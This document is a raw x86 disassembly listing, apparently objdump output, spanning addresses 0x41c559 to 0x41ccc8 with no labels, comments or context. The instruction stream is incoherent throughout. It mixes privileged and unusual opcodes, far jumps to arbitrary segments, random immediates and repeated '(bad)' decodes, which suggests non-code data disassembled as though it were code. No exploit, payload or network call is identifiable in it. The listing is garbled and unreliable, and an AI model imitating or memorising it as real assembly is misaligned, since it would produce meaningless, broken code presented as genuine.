  41c559:	adc    DWORD PTR [esi+0x31],0x31778114
  41c560:	adc    BYTE PTR [edx-0x50],dh
  41c563:	or     ah,BYTE PTR [ecx]
  41c565:	daa    
  41c566:	ins    DWORD PTR es:[edi],dx
  41c567:	xor    edi,0xffffffb6
  41c56a:	mov    bl,0xff
  41c56c:	xor    BYTE PTR [ecx-0x253ea64a],ch
  41c572:	ss pop ebx
  41c574:	shl    DWORD PTR [edi],0xcc
  41c577:	stos   DWORD PTR es:[edi],eax
  41c578:	gs push 0xffffffb8
  41c57b:	adc    al,BYTE PTR [eax]
  41c57d:	pop    ss
  41c57e:	inc    ecx
  41c57f:	add    DWORD PTR es:[edi],0xf072bc27
  41c586:	cmp    BYTE PTR [esi],al
  41c588:	adc    ch,bh
  41c58a:	pop    ds
  41c58b:	repz mov edi,0x5b6340f
  41c591:	icebp  
  41c592:	ret    0xe7b5
  41c595:	outs   dx,DWORD PTR ds:[esi]
  41c596:	xor    DWORD PTR [edi+0x1ace5efc],edi
  41c59c:	shr    BYTE PTR [ecx+0x7254c150],0x0
  41c5a3:	add    BYTE PTR [eax],al
  41c5a5:	add    BYTE PTR [eax],al
  41c5a7:	cmp    BYTE PTR [edx],bl
  41c5a9:	push   0x9
  41c5ab:	dec    edi
  41c5ac:	add    dl,BYTE PTR [esi+0x36]
  41c5af:	ror    DWORD PTR [ebx+0x16],cl
  41c5b2:	test   eax,0xdb058876
  41c5b7:	xchg   edx,eax
  41c5b8:	out    0x13,al
  41c5ba:	push   0xa
  41c5bc:	or     BYTE PTR [edx+ebp*8],ah
  41c5bf:	data16 add al,0x81
  41c5c2:	lea    ebx,[edx+0xa]
  41c5c5:	add    BYTE PTR [eax],al
  41c5c7:	and    eax,0x215f1845
  41c5cc:	mov    esp,0xdb041166
  41c5d1:	or     dh,BYTE PTR [ebx]
  41c5d3:	dec    esp
  41c5d4:	cmp    BYTE PTR [eax+0x24],0xa0
  41c5d8:	push   es
  41c5d9:	or     edx,DWORD PTR [esp+ebx*8-0x71ffbf6f]
  41c5e0:	jg     0x41c644
  41c5e2:	pop    ss
  41c5e3:	or     al,0x8e
  41c5e5:	inc    edx
  41c5e6:	add    DWORD PTR [esi],ebx
  41c5e8:	or     al,BYTE PTR [eax]
  41c5ea:	mov    bl,BYTE PTR [ebp-0x332f75e9]
  41c5f0:	fs jnp 0x41c667
  41c5f3:	push   ecx
  41c5f4:	jg     0x41c5ec
  41c5f6:	sbb    esi,DWORD PTR [ecx+0x17]
  41c5f9:	jg     0x41c677
  41c5fb:	xor    BYTE PTR [ebx],al
  41c5fd:	add    BYTE PTR [edi],cl
  41c5ff:	rol    ah,0xfa
  41c602:	retf   0x64cc
  41c605:	pop    ss
  41c606:	xor    cl,BYTE PTR [esi+eax*4]
  41c609:	fidivr WORD PTR [edi+0x0]
  41c60c:	add    BYTE PTR [eax],al
  41c60e:	add    BYTE PTR [eax],al
  41c610:	out    dx,al
  41c611:	into   
  41c612:	test   BYTE PTR [ecx+0x43],dl
  41c615:	lds    eax,FWORD PTR [eax]
  41c617:	add    BYTE PTR [edi+0xb08244a],dl
  41c61d:	xor    BYTE PTR [ecx+0x24],al
  41c620:	sbb    BYTE PTR [edi-0x18],cl
  41c623:	je     0x41c669
  41c625:	push   es
  41c626:	add    bl,al
  41c628:	stos   DWORD PTR es:[edi],eax
  41c629:	cli    
  41c62a:	and    ecx,DWORD PTR [eax]
  41c62c:	inc    esp
  41c62d:	mov    esp,ss
  41c62f:	add    ah,bl
  41c631:	ret    
  41c632:	ret    
  41c633:	add    eax,0x3fcac8
  41c638:	add    BYTE PTR [edi],ah
  41c63a:	add    BYTE PTR ds:[ebx+0x1fcc2009],ah
  41c641:	jmp    DWORD PTR [ebx-0x58]
  41c644:	jne    0x41c6b0
  41c646:	add    BYTE PTR [eax+0x3c2de874],dh
  41c64c:	pop    ds
  41c64d:	mov    cl,0xc1
  41c64f:	xor    cl,ch
  41c651:	adc    al,BYTE PTR [ebp+0x0]
  41c654:	mov    ds:0x350ee4dd,al
  41c659:	test   eax,0xb709bf87
  41c65e:	test   DWORD PTR [edi+0x5d],ebx
  41c661:	test   eax,0xfd553fc9
  41c666:	imul   edi,DWORD PTR [esi],0x75
  41c669:	fs inc eax
  41c66b:	and    al,0xd9
  41c66d:	xchg   ebx,eax
  41c66e:	inc    ebx
  41c66f:	add    BYTE PTR [esi],dh
  41c671:	xor    eax,0x8307
  41c676:	add    BYTE PTR [eax],al
  41c678:	add    BYTE PTR ds:0xab88e6f8,dh
  41c67e:	lahf   
  41c67f:	dec    ebx
  41c680:	je     0x41c700
  41c682:	repnz ss push cs
  41c685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c686:	xchg   ebx,eax
  41c687:	mov    cl,0x93
  41c689:	je     0x41c636
  41c68b:	lods   eax,DWORD PTR ds:[esi]
  41c68c:	add    eax,0x6e9983a5
  41c691:	je     0x41c63e
  41c693:	shl    DWORD PTR ds:0xffd8c11d,0x22
  41c69a:	sub    eax,0x1f7ffe7
  41c69f:	or     BYTE PTR [eax],al
  41c6a1:	ss ja  0x41c631
  41c6a4:	jmp    0x41c69c
  41c6a6:	inc    edi
  41c6a7:	or     eax,0x1579881
  41c6ac:	adc    DWORD PTR [eax+0x4a560153],0x3e7b934
  41c6b6:	stc    
  41c6b7:	sar    esp,0xee
  41c6ba:	sti    
  41c6bb:	xchg   ebp,esi
  41c6bd:	popa   
  41c6be:	sub    bh,BYTE PTR gs:[eax]
  41c6c1:	pop    ebp
  41c6c2:	add    dl,dh
  41c6c4:	cmp    DWORD PTR ds:0x28b49102,esi
  41c6ca:	stos   BYTE PTR es:[edi],al
  41c6cb:	xchg   edx,eax
  41c6cc:	inc    ecx
  41c6cd:	mov    edx,0x27c363b9
  41c6d2:	repz jno 0x41c71d
  41c6d5:	jge    0x41c662
  41c6d7:	in     al,0x8e
  41c6d9:	aaa    
  41c6da:	push   es
  41c6db:	pusha  
  41c6dc:	dec    ecx
  41c6dd:	add    BYTE PTR [eax],al
  41c6df:	add    BYTE PTR [eax],al
  41c6e1:	add    BYTE PTR [ecx-0x73],dh
  41c6e4:	mov    ds:0xf340fa13,eax
  41c6e9:	mov    WORD PTR [ecx+0x2c],?
  41c6ec:	jecxz  0x41c747
  41c6ee:	cli    
  41c6ef:	das    
  41c6f0:	fcmovne st,st(1)
  41c6f2:	aaa    
  41c6f3:	mov    edx,0x27503e8
  41c6f8:	jo     0x41c744
  41c6fa:	test   DWORD PTR [edx-0x469c7c2a],ebp
  41c700:	popa   
  41c701:	push   edx
  41c702:	or     DWORD PTR [ebx-0x52b57323],0x7a5d59ef
  41c70c:	mov    ch,0x4
  41c70e:	jne    0x41c73c
  41c710:	xchg   ebx,eax
  41c711:	popa   
  41c712:	out    dx,al
  41c713:	cs xchg ebx,eax
  41c715:	lods   al,BYTE PTR ds:[esi]
  41c716:	xchg   esp,eax
  41c717:	mov    ecx,0xc0fdc185
  41c71c:	sbb    eax,0xe2c43a62
  41c721:	add    eax,esi
  41c723:	lea    edi,[edx-0x7b]
  41c726:	push   ds
  41c727:	adc    bh,BYTE PTR [ebp-0x78e2a8]
  41c72d:	add    dh,BYTE PTR [ebp-0x47]
  41c730:	fisttp DWORD PTR [edi]
  41c732:	hlt    
  41c733:	inc    esi
  41c734:	dec    edi
  41c735:	shl    ecx,0x2e
  41c738:	out    dx,eax
  41c739:	mov    dh,BYTE PTR [edi]
  41c73b:	mov    dh,0xd0
  41c73d:	add    eax,0x63ffb0a4
  41c742:	call   0x0:0x6057b2
  41c749:	add    BYTE PTR [eax],al
  41c74b:	mov    ch,BYTE PTR [esi-0x4682a219]
  41c751:	cld    
  41c752:	mov    edx,0xfb1813b5
  41c757:	add    cl,BYTE PTR ss:[ecx-0x30e695e]
  41c75e:	ins    BYTE PTR es:[edi],dx
  41c75f:	mov    esi,0x38723434
  41c764:	push   ss
  41c765:	mov    ecx,ebx
  41c767:	cdq    
  41c768:	push   ebx
  41c769:	lock jne 0x41c6fb
  41c76c:	xor    ebp,0x5c
  41c76f:	imul   ecx,DWORD PTR [ebx+0x487fdd52],0x8
  41c776:	pop    edx
  41c777:	ins    DWORD PTR es:[edi],dx
  41c778:	mov    ebp,edi
  41c77a:	ret    0x8984
  41c77d:	dec    edi
  41c77e:	in     eax,dx
  41c77f:	imul   edx,DWORD PTR [ebp-0x8],0x427f6f3a
  41c786:	mov    ebp,0x26f854ef
  41c78b:	clc    
  41c78c:	ja     0x41c799
  41c78e:	loop   0x41c79f
  41c790:	xor    dl,cl
  41c792:	fs cld 
  41c794:	xor    al,0x61
  41c796:	push   0xe9009fff
  41c79b:	jbe    0x41c7d1
  41c79d:	xor    esi,DWORD PTR [edx+0x63]
  41c7a0:	scas   al,BYTE PTR es:[edi]
  41c7a1:	xor    BYTE PTR [edi-0x2f],0x51
  41c7a5:	mov    DWORD PTR [esi*1+0x48e147f1],esp
  41c7ac:	push   cs
  41c7ad:	(bad)  
  41c7ae:	lods   al,BYTE PTR ds:[esi]
  41c7af:	add    BYTE PTR [eax],al
  41c7b1:	add    BYTE PTR [eax],al
  41c7b3:	add    BYTE PTR [ebp+0x2],ah
  41c7b6:	push   ecx
  41c7b7:	pop    esi
  41c7b8:	imul   edx,DWORD PTR [esi],0x12
  41c7bb:	test   eax,0xde428c76
  41c7c0:	push   ebp
  41c7c1:	pop    eax
  41c7c2:	mov    DWORD PTR [eax],0x89000b9e
  41c7c8:	and    al,0x0
  41c7ca:	jge    0x41c78d
  41c7cc:	jmp    0x84b:0x55ffffff
  41c7d3:	(bad)  
  41c7d4:	sbb    DWORD PTR [ebx],edx
  41c7d6:	std    
  41c7d7:	jmp    0xc3f7:0x13d8882
  41c7de:	or     BYTE PTR [eax+0x51],dl
  41c7e1:	out    dx,al
  41c7e2:	sbb    ebp,eax
  41c7e4:	add    bl,dl
  41c7e6:	cld    
  41c7e7:	call   FWORD PTR [eax]
  41c7e9:	ret    
  41c7ea:	jo     0x41c7b3
  41c7ec:	pop    ss
  41c7ed:	and    BYTE PTR ds:[ebx+0xcf5eb8c],cl
  41c7f4:	lahf   
  41c7f5:	hlt    
  41c7f6:	sbb    ecx,DWORD PTR [ebp+0x4384fd4c]
  41c7fc:	ins    BYTE PTR es:[edi],dx
  41c7fd:	cli    
  41c7fe:	mov    bl,0x8b
  41c800:	cdq    
  41c801:	outs   dx,BYTE PTR ds:[esi]
  41c802:	test   DWORD PTR [esi],eax
  41c804:	out    0x49,eax
  41c806:	cld    
  41c807:	mov    DWORD PTR [edx+0x48a6010a],ebx
  41c80d:	add    eax,DWORD PTR [eax]
  41c80f:	mov    DWORD PTR [edx-0x704018fa],ebx
  41c815:	dec    edi
  41c816:	push   esi
  41c817:	inc    DWORD PTR [eax]
  41c819:	add    BYTE PTR [eax],al
  41c81b:	add    BYTE PTR [eax],al
  41c81d:	dec    ecx
  41c81e:	sbb    edx,DWORD PTR [edx]
  41c820:	inc    eax
  41c821:	dec    esp
  41c822:	mov    ah,0xd7
  41c824:	xor    eax,DWORD PTR [ebx]
  41c826:	mov    dh,0x5a
  41c828:	and    al,0x2a
  41c82a:	mov    cl,0xb
  41c82c:	mov    dh,0x5a
  41c82e:	test   eax,0xaa52b60b
  41c833:	inc    esi
  41c835:	iret   
  41c836:	shl    bl,1
  41c838:	icebp  
  41c839:	psubq  mm6,QWORD PTR es:[eax+edi*2+0xe]
  41c83f:	shl    BYTE PTR [di-0x4b],cl
  41c843:	pop    DWORD PTR [ebx-0x59]
  41c846:	call   DWORD PTR [ebx-0x3]
  41c849:	and    BYTE PTR [ecx+0x12],0x40
  41c84d:	jne    0x41c87b
  41c84f:	enter  0xf00b,0xe8
  41c853:	aaa    
  41c854:	sbb    DWORD PTR [edx+0x3224462f],eax
  41c85a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c85b:	mov    eax,0x5632b371
  41c860:	and    al,0xf5
  41c862:	adc    dh,dl
  41c864:	jo     0x41c7f3
  41c866:	fdiv   DWORD PTR [edx-0x37]
  41c869:	stos   DWORD PTR es:[edi],eax
  41c86a:	jmp    0x55e2:0x1459558b
  41c871:	call   0x5da9:0x35121cd5
  41c878:	mov    dh,BYTE PTR [esi+0x7503c243]
  41c87e:	xor    eax,DWORD PTR [ebx+0x23]
  41c881:	add    BYTE PTR [eax],al
  41c883:	add    BYTE PTR [eax],al
  41c885:	add    BYTE PTR [edx-0x69],ch
  41c888:	enter  0x35fd,0xd5
  41c88c:	jb     0x41c84d
  41c88e:	jp     0x41c8c5
  41c890:	mov    bh,0x96
  41c892:	push   0x75
  41c894:	mov    BYTE PTR [ebp-0x70],dl
  41c897:	inc    eax
  41c898:	retf   
  41c899:	adc    ebx,edi
  41c89b:	iret   
  41c89c:	mov    ebp,0x8fbb9173
  41c8a1:	inc    ebx
  41c8a2:	test   BYTE PTR [ebp-0x209f02b0],bh
  41c8a8:	adc    eax,0xc5287540
  41c8ad:	or     esp,esi
  41c8af:	stos   BYTE PTR es:[edi],al
  41c8b0:	test   eax,0xe80feec0
  41c8b5:	add    eax,ebx
  41c8b7:	add    dl,dl
  41c8b9:	or     ebp,DWORD PTR [edx-0x4d7743e0]
  41c8bf:	add    ch,bh
  41c8c1:	sub    dh,BYTE PTR ds:0x71366c07
  41c8c7:	mov    esp,esp
  41c8c9:	add    al,dl
  41c8cb:	add    DWORD PTR [eax],ebp
  41c8cd:	cli    
  41c8ce:	mov    ebx,0x2c90f230
  41c8d3:	push   es
  41c8d4:	cdq    
  41c8d5:	stos   DWORD PTR es:[edi],eax
  41c8d6:	xor    ch,cl
  41c8d8:	out    0x3,al
  41c8da:	fadd   QWORD PTR [eax]
  41c8dc:	stc    
  41c8dd:	ret    
  41c8de:	test   dl,0x9a
  41c8e1:	push   cs
  41c8e2:	rol    BYTE PTR [ebp-0x11],0x8a
  41c8e6:	cmp    DWORD PTR [edx],ecx
  41c8e8:	cmp    BYTE PTR [esi+0x0],0x0
  41c8ef:	jle    0x41c93e
  41c8f1:	push   DWORD PTR [ebx]
  41c8f3:	mov    BYTE PTR [edx],0xe7
  41c8f6:	pop    esi
  41c8f7:	inc    ebx
  41c8f8:	shl    dl,0x3
  41c8fb:	in     al,dx
  41c8fc:	ds retf 
  41c8fe:	pop    es
  41c8ff:	dec    esp
  41c900:	inc    ebx
  41c901:	fbstp  TBYTE PTR [edx]
  41c903:	jp     0x41c890
  41c905:	daa    
  41c906:	or     al,0xc
  41c908:	ret    0x55ea
  41c90b:	and    eax,0x5d085787
  41c910:	push   ecx
  41c911:	mov    ah,0x4
  41c913:	jne    0x41c969
  41c915:	test   eax,0x724f7508
  41c91a:	mov    al,0xf5
  41c91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c91d:	(bad)  
  41c91e:	push   eax
  41c91f:	fild   WORD PTR [ebx]
  41c921:	push   ss
  41c922:	mov    ebp,0x43f6de67
  41c927:	jne    0x41c9a8
  41c929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c92a:	cmp    dl,al
  41c92c:	icebp  
  41c92d:	mov    cl,0x51
  41c92f:	les    ebp,FWORD PTR [eax]
  41c931:	call   0xcf50f18a
  41c936:	adc    esi,DWORD PTR [ebp-0x593b9bfe]
  41c93c:	sub    al,BYTE PTR [eax]
  41c93e:	sbb    al,BYTE PTR [edx]
  41c940:	inc    eax
  41c941:	cld    
  41c942:	sbb    DWORD PTR [edi-0x4b],ebx
  41c945:	fs xchg ecx,eax
  41c947:	inc    ecx
  41c948:	inc    edx
  41c949:	add    BYTE PTR [esi+0x62],bl
  41c94c:	out    0xf,al
  41c94e:	test   eax,0xd5bf8176
  41c953:	add    BYTE PTR [eax],al
  41c955:	add    BYTE PTR [eax],al
  41c957:	add    bh,ch
  41c959:	xchg   DWORD PTR [edx+0x3d],eax
  41c95c:	dec    ecx
  41c95d:	mov    DWORD PTR [edx+0x41],eax
  41c960:	inc    ecx
  41c961:	mov    DWORD PTR [edx+0x39],eax
  41c964:	sub    DWORD PTR [edi+0x57fe2d72],esi
  41c96a:	clc    
  41c96b:	es push 0xfffffff2
  41c96e:	pop    gs
  41c970:	jbe    0x41c8f3
  41c972:	mov    edi,0x72b78a9d
  41c977:	adc    eax,0x6f82fe8
  41c97c:	push   0xffffffb2
  41c97e:	push   esp
  41c97f:	inc    BYTE PTR [ebx+0x76a90fee]
  41c985:	cmp    DWORD PTR [edi+0x72b77b74],0x880fc1e5
  41c98f:	sti    
  41c990:	add    al,BYTE PTR ss:[ecx+0x38b73524]
  41c997:	fisub  DWORD PTR [edx+0x72efc506]
  41c99d:	add    al,BYTE PTR [eax]
  41c99f:	jmp    0x6045ff93
  41c9a4:	mov    al,0xa
  41c9a6:	mov    DWORD PTR [esi*1+0x36da01ab],esp
  41c9ad:	pop    ebx
  41c9ae:	(bad)  
  41c9af:	stos   BYTE PTR es:[edi],al
  41c9b0:	mov    ds:0xcb38eb89,eax
  41c9b5:	mov    DWORD PTR [edx],esi
  41c9b7:	leave  
  41c9b8:	xchg   BYTE PTR [edx+0x0],al
  41c9bb:	add    BYTE PTR [eax],al
  41c9bd:	add    BYTE PTR [eax],al
  41c9bf:	add    BYTE PTR [eax],al
  41c9c1:	add    DWORD PTR [ebx-0x178303bf],0xffffffff
  41c9c8:	imul   ebx,DWORD PTR [edx+ebp*8],0x801fefc
  41c9cf:	sti    
  41c9d0:	(bad)  
  41c9d1:	xchg   ecx,eax
  41c9d2:	mov    edi,0xc9b3a71
  41c9d7:	or     al,0x13
  41c9d9:	sbb    al,0x0
  41c9db:	jg     0x41c9d5
  41c9dd:	(bad)  
  41c9de:	in     al,dx
  41c9df:	sub    cl,BYTE PTR [ebx-0x3f7e8bef]
  41c9e5:	and    BYTE PTR [eax-0x8f2e1c],ch
  41c9eb:	dec    DWORD PTR [edx+0x74fb7c84]
  41c9f1:	jns    0x41c976
  41c9f3:	inc    ecx
  41c9f4:	cld    
  41c9f5:	cld    
  41c9f6:	jbe    0x41ca69
  41c9f8:	cld    
  41c9f9:	repz jmp 0x843c8fb
  41c9ff:	sti    
  41ca00:	(bad)  
  41ca01:	adc    DWORD PTR [edi-0x41d8fb90],edi
  41ca07:	out    0x8,eax
  41ca09:	repz addr16 fst st(4)
  41ca0d:	pushf  
  41ca0e:	jmp    FWORD PTR [esi]
  41ca10:	sar    BYTE PTR [ebx],0x58
  41ca13:	(bad)
  41ca16:	call   DWORD PTR [ebp-0x75]
  41ca19:	xchg   ecx,eax
  41ca1a:	ficom  WORD PTR [eax]
  41ca1c:	inc    eax
  41ca1d:	pop    esp
  41ca1e:	push   eax
  41ca1f:	push   0x1
  41ca21:	cmp    esi,edx
  41ca23:	and    edx,DWORD PTR [eax+eax*1]
  41ca26:	add    BYTE PTR [eax],al
  41ca28:	add    BYTE PTR [eax],al
  41ca2a:	inc    edi
  41ca2b:	or     al,0x87
  41ca2d:	push   esp
  41ca2e:	or     BYTE PTR [edx],0x87
  41ca31:	iret   
  41ca32:	xor    al,0x70
  41ca34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca35:	add    BYTE PTR [ebx+esi*1-0x43],cl
  41ca39:	je     0x41ca82
  41ca3b:	in     eax,0xfe
  41ca3d:	push   esi
  41ca3e:	jne    0x41c9cc
  41ca40:	ror    DWORD PTR [eax+0x72b91e2d],1
  41ca46:	sbb    ebx,esp
  41ca48:	pop    ecx
  41ca49:	ret    0xa96d
  41ca4c:	dec    edi
  41ca4d:	mov    DWORD PTR [ecx],esp
  41ca4f:	sub    BYTE PTR [eax+0x1034f6f7],ah
  41ca55:	push   ecx
  41ca56:	stos   DWORD PTR es:[edi],eax
  41ca57:	je     0x41ca12
  41ca59:	jb     0x41cac4
  41ca5b:	xor    BYTE PTR [esi-0x745e9704],dh
  41ca61:	jae    0x41c9f4
  41ca63:	std    
  41ca64:	mov    cl,BYTE PTR [ebx-0x67]
  41ca67:	mov    eax,ds:0xce7112b9
  41ca6c:	inc    eax
  41ca6d:	add    dh,bh
  41ca6f:	adc    BYTE PTR [edi-0x28],bh
  41ca72:	jp     0x41ca91
  41ca74:	(bad)  
  41ca75:	inc    edx
  41ca77:	test   al,0x9
  41ca79:	mov    ch,0x28
  41ca7b:	mov    cl,0x87
  41ca7d:	inc    ebx
  41ca7e:	pop    ecx
  41ca7f:	mov    cl,0x50
  41ca81:	std    
  41ca82:	and    DWORD PTR [ebp+0x65ea0d0c],edi
  41ca88:	add    al,0x6a
  41ca8a:	ja     0x41ca76
  41ca8c:	mov    ds:0xf,eax
  41ca91:	add    BYTE PTR [eax],al
  41ca93:	jle    0x41ca7f
  41ca95:	push   ebx
  41ca96:	push   0x75
  41ca98:	cmp    DWORD PTR [edi+edi*8-0x7e],0x60fd55a8
  41caa0:	cmp    eax,0x1e75400f
  41caa5:	shl    DWORD PTR [edx+0x71],0xc
  41caa9:	fucomp st(0)
  41caab:	shl    DWORD PTR [edi*1-0x46e382dc],0xfc
  41cab3:	enter  0x8ce6,0x32
  41cab7:	jns    0x41ca8f
  41cab9:	inc    eax
  41caba:	add    bh,cl
  41cabc:	add    dl,BYTE PTR [edi-0x3cb10daa]
  41cac2:	pop    ss
  41cac3:	xor    cl,bl
  41cac5:	popa   
  41cac6:	clc    
  41cac7:	xchg   BYTE PTR [edi],dl
  41cac9:	daa    
  41caca:	add    al,0x6e
  41cacc:	add    ah,bh
  41cace:	add    ebp,DWORD PTR [ebp+0x52]
  41cad1:	adc    DWORD PTR [ebp+eiz*4-0x7845624f],esi
  41cad8:	(bad)  
  41cad9:	popa   
  41cada:	dec    edi
  41cadb:	pop    ecx
  41cadc:	loop   0x41cb43
  41cade:	xor    BYTE PTR [ebp+0x7d],ch
  41cae1:	stos   BYTE PTR es:[edi],al
  41cae2:	fisttp WORD PTR [edx-0x16454066]
  41cae8:	mov    cl,0xc0
  41caea:	mov    bl,0xe1
  41caec:	or     ebx,DWORD PTR ss:[esp+ebp*8]
  41caf0:	retf   0xd13d
  41caf3:	xchg   edi,eax
  41caf4:	mov    cl,0x35
  41caf6:	mov    edx,0x0
  41cafb:	add    cl,al
  41cafd:	push   edx
  41cafe:	shl    DWORD PTR [ebx+0x17cb36c1],0xb8
  41cb05:	fst    DWORD PTR [ecx]
  41cb07:	add    esi,esi
  41cb09:	mov    eax,0x8f2059a
  41cb0e:	scas   al,BYTE PTR es:[edi]
  41cb0f:	pop    ecx
  41cb10:	in     al,dx
  41cb11:	lds    esp,FWORD PTR [ecx+0x294f978e]
  41cb17:	or     esi,DWORD PTR [ebp+0x57]
  41cb1a:	bound  esp,QWORD PTR [edi+0x4da9e0b]
  41cb20:	jne    0x41cb24
  41cb22:	cmp    eax,0x96018a8d
  41cb27:	aas    
  41cb28:	cmp    DWORD PTR [ebp-0x5c],0xe2124bc3
  41cb2f:	ret    0x3eed
  41cb32:	out    dx,eax
  41cb33:	mov    WORD PTR [ebx+0x7b],?
  41cb36:	and    ecx,DWORD PTR [eax]
  41cb38:	cld    
  41cb39:	cmp    al,BYTE PTR [eax]
  41cb3b:	aad    0x37
  41cb3d:	rol    BYTE PTR [edi],1
  41cb3f:	loop   0x41cb78
  41cb41:	mov    BYTE PTR [edx-0xb],al
  41cb44:	repz inc ebx
  41cb46:	or     al,0x70
  41cb48:	mov    dl,0xad
  41cb4a:	std    
  41cb4b:	xchg   esi,eax
  41cb4c:	in     al,dx
  41cb4d:	jnp    0x41cad1
  41cb4f:	xchg   ecx,eax
  41cb50:	fild   QWORD PTR [ebp-0x46655104]
  41cb56:	std    
  41cb57:	jle    0x41cb25
  41cb59:	scas   eax,DWORD PTR es:[edi]
  41cb5a:	cld    
  41cb5b:	jmp    0xe9c492d6
  41cb60:	add    BYTE PTR [eax],al
  41cb62:	add    BYTE PTR [eax],al
  41cb64:	add    BYTE PTR [ebp+0x76edfcad],bh
  41cb6a:	add    al,BYTE PTR [eax]
  41cb6c:	push   ecx
  41cb6d:	mov    ds:0x4f56fd23,al
  41cb72:	leave  
  41cb73:	shl    ecx,0x76
  41cb76:	push   ebp
  41cb77:	mov    DWORD PTR [ebp-0x10],edx
  41cb7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb7b:	neg    DWORD PTR [eax-0x16f3d407]
  41cb81:	and    DWORD PTR [eax+0x55],ebx
  41cb84:	mov    ch,0x63
  41cb86:	jnp    0x41cbe2
  41cb88:	std    
  41cb89:	imul   DWORD PTR [ecx-0x4ef3e141]
  41cb8f:	jne    0x41cb44
  41cb91:	stc    
  41cb92:	sub    ecx,DWORD PTR [eax]
  41cb94:	bound  esi,QWORD PTR [ebx+edi*2+0x3f]
  41cb98:	(bad)  
  41cb9a:	cmp    al,0x18
  41cb9c:	fld    DWORD PTR [ecx]
  41cb9e:	mov    dh,0xe7
  41cba0:	dec    eax
  41cba1:	mov    ds:0xb965fcb0,eax
  41cba6:	xor    al,0x41
  41cba8:	jb     0x41cc1f
  41cbaa:	jnp    0x41cc1b
  41cbac:	cmc    
  41cbad:	jns    0x41cb61
  41cbaf:	xchg   BYTE PTR [edi],dh
  41cbb1:	jns    0x41cb36
  41cbb3:	fcom   DWORD PTR [ebp-0x7c]
  41cbb6:	lods   eax,DWORD PTR ds:[esi]
  41cbb7:	jb     0x41cbb9
  41cbb9:	pusha  
  41cbba:	jg     0x41cb7b
  41cbbc:	mov    esi,DWORD PTR [ecx+0x16]
  41cbbf:	push   ebx
  41cbc0:	lea    eax,[edx+0x1358e816]
  41cbc6:	imul   edi,ebx,0xffffff8b
  41cbc9:	add    BYTE PTR [eax],al
  41cbcb:	add    BYTE PTR [eax],al
  41cbcd:	add    BYTE PTR [ecx+0x247d8712],dh
  41cbd3:	jg     0x41cc16
  41cbd5:	or     al,0x97
  41cbd7:	cmp    DWORD PTR [eax],ecx
  41cbd9:	mov    DWORD PTR [edx],ebx
  41cbdb:	ret    
  41cbdc:	inc    edx
  41cbdd:	add    al,0xc
  41cbdf:	add    al,0x2
  41cbe1:	add    BYTE PTR [ebp+0x1b8b0c49],al
  41cbe7:	xchg   DWORD PTR [ebp+0x143c0d10],edi
  41cbed:	mov    al,0xd
  41cbef:	pop    edi
  41cbf0:	(bad)  
  41cbf1:	xor    DWORD PTR [edx+ecx*2-0x6fa8a4a2],ebx
  41cbf8:	pop    ecx
  41cbf9:	ret    0x3dc
  41cbfc:	push   ecx
  41cbfd:	mov    eax,DWORD PTR [eax-0x7a]
  41cc00:	call   0x71acbb11
  41cc05:	adc    BYTE PTR [ecx-0x10],dl
  41cc08:	repz xor esp,DWORD PTR [edi+0x53]
  41cc0c:	test   DWORD PTR [ebp+0x58],ebx
  41cc0f:	jl     0x41cc6a
  41cc11:	cld    
  41cc12:	test   BYTE PTR [eax+0x11],dh
  41cc15:	add    DWORD PTR [edi+ebp*1+0x6ac375bd],ebx
  41cc1c:	jno    0x41cc12
  41cc1e:	test   BYTE PTR [ebp-0x32],bl
  41cc21:	add    BYTE PTR [ebp+edi*2-0x3aaaa441],bl
  41cc28:	or     BYTE PTR [eax],al
  41cc2a:	xchg   ebx,eax
  41cc2b:	(bad)  
  41cc2d:	call   FWORD PTR [ecx]
  41cc2f:	jb     0x41cc2c
  41cc31:	jne    0x41cc33
  41cc33:	add    BYTE PTR [eax],al
  41cc35:	add    BYTE PTR [eax],al
  41cc37:	pusha  
  41cc38:	js     0x41ccab
  41cc3a:	or     BYTE PTR [ebp-0x3f],dh
  41cc3d:	inc    edx
  41cc3e:	std    
  41cc3f:	(bad)  
  41cc40:	ror    BYTE PTR [ecx+0x7e654ed7],0xbf
  41cc47:	enter  0x899e,0xfe
  41cc4b:	div    eax
  41cc4d:	cmovo  eax,edi
  41cc50:	or     BYTE PTR [ecx-0x36b7a41],al
  41cc56:	mov    ch,al
  41cc58:	mov    cl,0x87
  41cc5a:	inc    ebx
  41cc5b:	ja     0x41cc06
  41cc5d:	mov    DWORD PTR [esi],ecx
  41cc5f:	out    dx,al
  41cc60:	pusha  
  41cc61:	call   0x104cbb2f
  41cc66:	xor    DWORD PTR [ecx+ecx*8],0xa482c9f9
  41cc6d:	dec    edx
  41cc6e:	mov    DWORD PTR [ebp+0x3eef01a1],eax
  41cc74:	dec    ebx
  41cc75:	push   esi
  41cc76:	jbe    0x41ccef
  41cc78:	or     al,0xc4
  41cc7a:	shl    BYTE PTR [esi-0x11eb5727],0xa0
  41cc81:	stc    
  41cc82:	dec    ebx
  41cc83:	xchg   ecx,eax
  41cc84:	mov    cl,0x2f
  41cc86:	or     eax,0x7efc70fe
  41cc8b:	aam    0x98
  41cc8d:	add    BYTE PTR [eax],al
  41cc8f:	inc    ebp
  41cc90:	mov    dl,0x44
  41cc92:	and    al,0x69
  41cc94:	lea    eax,[edi]
  41cc96:	mov    DWORD PTR [ecx-0x3b],eax
  41cc99:	cld    
  41cc9a:	out    0x0,eax
  41cc9c:	add    BYTE PTR [eax],al
  41cc9e:	add    BYTE PTR [eax],al
  41cca0:	rcl    DWORD PTR [edi],cl
  41cca2:	mov    ch,0xfc
  41cca4:	clc    
  41cca5:	fsubr  DWORD PTR [esi]
  41cca7:	fdiv   QWORD PTR [edi-0x1acff4c]
  41ccad:	cld    
  41ccae:	push   edx
  41ccaf:	mov    DWORD PTR [ebx],esi
  41ccb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccb2:	push   ecx
  41ccb3:	push   ebp
  41ccb4:	clc    
  41ccb5:	fsubr  DWORD PTR [edi]
  41ccb7:	push   0xfffffff6
  41ccb9:	add    DWORD PTR [edi+0x159ac501],esp
  41ccbf:	shr    BYTE PTR [edx-0x52],cl
  41ccc2:	popa   
  41ccc3:	mov    ebx,0x80cb2ffb
  41ccc8:	pop    ecx
